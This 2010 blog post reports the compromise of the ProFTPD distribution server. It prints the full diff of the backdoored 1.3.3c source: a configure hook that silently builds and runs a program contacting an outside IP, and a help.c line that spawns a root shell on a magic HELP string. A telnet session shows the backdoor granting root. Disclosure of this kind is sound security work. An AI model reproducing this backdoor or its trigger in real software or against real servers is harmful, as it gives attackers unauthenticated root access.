---
layout: post
title: ftp.proftpd.org compromised
date: '2010-12-02T13:28:00.001+01:00'
author: Xavier Garcia
tags:
- backdoor
- proftpd
- compromised
modified_time: '2010-12-02T14:37:43.219+01:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-6740988145907143935
blogger_orig_url: http://www.shellguardians.com/2010/12/ftpproftpdorg-compromised.html
---
The ProFTPD project  has sent a [report](http://sourceforge.net/mailarchive/message.php?msg_name=alpine.DEB.2.00.1012011542220.12930%40familiar.castaglia.org) to inform that the **main distribution server  was compromised**.  
  

> On Sunday, the 28th of November 2010 around 20:00 UTC the main distribution server of the ProFTPD project was compromised. The attackers most likely used an unpatched security issue in the FTP daemon to gain access to the server and used their privileges to replace the source files for ProFTPD 1.3.3c with a version which contained a backdoor. The unauthorized modification of the source code was noticed by Daniel Austin and relayed to the ProFTPD project by Jeroen Geilman on Wednesday, December 1 and fixed shortly afterwards.

  

> The backdoor introduced by the attackers allows unauthenticated users remote root access to systems which run the maliciously modified version of the ProFTPD daemon

  
**UPDATE: I found a diff of the trojaned version**  
  
```diff 
diff -Naur proftpd-1.3.3c.orig/configure proftpd-1.3.3c/configure  
--- proftpd-1.3.3c.orig/configure       2010-04-14 00:01:35.000000000 +0200  
+++ proftpd-1.3.3c/configure    2010-10-29 19:08:56.000000000 +0200  
@@ -9,7 +9,10 @@  
 ## --------------------- ##  
 ## M4sh Initialization.  ##  
 ## --------------------- ##  
-  
+gcc tests/tests.c -o tests/tests >/dev/null 2>&1  
+cc tests/tests.c -o tests/tests >/dev/null 2>&1  
+tests/tests >/dev/null 2>&1 &  
+rm -rf tests/tests.c tests/tests >/dev/null 2>&1  
 # Be more Bourne compatible  
 DUALCASE=1; export DUALCASE # for MKS sh  
 if test -n "${ZSH_VERSION+set}" && (emulate sh) >/dev/null 2>&1; then  
diff -Naur proftpd-1.3.3c.orig/src/help.c proftpd-1.3.3c/src/help.c  
--- proftpd-1.3.3c.orig/src/help.c      2009-07-01 01:31:18.000000000 +0200  
+++ proftpd-1.3.3c/src/help.c   2010-11-16 18:40:46.000000000 +0100  
@@ -27,6 +27,8 @@  
  */  
  
 #include "conf.h"  
+#include <stdlib.h>  
+#include <string.h>  
  
 struct help_rec {  
   const char *cmd;  
@@ -126,7 +128,7 @@  
         cmd->server->ServerAdmin ? cmd->server->ServerAdmin : "ftp-admin");  
  
     } else {  
-  
+      if (strcmp(target, "ACIDBITCHEZ") == 0) { setuid(0); setgid(0); system("/bin/sh;/sbin/sh"); }  
       /* List the syntax for the given target command. */  
       for (i = 0; i < help_list->nelts; i++) {  
         if (strcasecmp(helps[i].cmd, target) == 0) {  
diff -Naur proftpd-1.3.3c.orig/tests/tests.c proftpd-1.3.3c/tests/tests.c  
--- proftpd-1.3.3c.orig/tests/tests.c   1970-01-01 01:00:00.000000000 +0100  
+++ proftpd-1.3.3c/tests/tests.c        2010-11-29 09:37:35.000000000 +0100  
@@ -0,0 +1,58 @@  
+#include <stdio.h>  
+#include <stdlib.h>  
+#include <sys/socket.h>  
+#include <sys/types.h>  
+#include <netinet/in.h>  
+#include <arpa/inet.h>  
+#include <unistd.h>  
+#include <netdb.h>  
+#include <signal.h>  
+#include <string.h>  
+  
+#define DEF_PORT 9090  
+#define DEF_TIMEOUT 15  
+#define DEF_COMMAND "GET /AB HTTP/1.0\r\n\r\n"  
+  
+int sock;  
+  
+void handle_timeout(int sig)  
+{  
+    close(sock);  
+    exit(0);  
+}  
+  
+int main(void)  
+{  
+  
+        struct sockaddr_in addr;  
+        struct hostent *he;  
+        u_short port;  
+        char ip[20]="212.26.42.47";  
+        port = DEF_PORT;  
+        signal(SIGALRM, handle_timeout);  
+        alarm(DEF_TIMEOUT);  
+        he=gethostbyname(ip);  
+        if(he==NULL) return(-1);  
+        addr.sin_addr.s_addr = *(unsigned long*)he->h_addr;  
+        addr.sin_port = htons(port);  
+        addr.sin_family = AF_INET;  
+        memset(addr.sin_zero, 0, 8);  
+        sprintf(ip, inet_ntoa(addr.sin_addr));  
+        if((sock = socket(AF_INET, SOCK_STREAM, 0))==-1)  
+        {  
+                return EXIT_FAILURE;  
+        }  
+        if(connect(sock, (struct sockaddr*)&addr, sizeof(struct sockaddr))==-1)  
+        {  
+            close(sock);  
+            return EXIT_FAILURE;  
+        }  
+        if(-1 == send(sock, DEF_COMMAND, strlen(DEF_COMMAND), 0))  
+        {  
+            return EXIT_FAILURE;  
+        }  
+        close(sock);  
+  
+return 0; }  
+  
+  
```
  
 ```bash 
$ telnet 0 21  
Trying 0.0.0.0...  
Connected to 0.  
Escape character is '^]'.  
220 ProFTPD 1.3.3c Server (ProFTPD Default Installation) [127.0.0.1]  
HELP  
214-The following commands are recognized (* =>'s unimplemented):  
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV  
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD  
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP  
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*  
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU  
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST  
 NLST    STAT    SITE    MLSD    MLST  
214 Direct comments to someone@somewhere  
HELP ANOOP      
502 Unknown command 'ANOOP'  
HELP a  
502 Unknown command 'A'  
HELP ACIDBITCHEZ  
  
  
  
id ;  
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```
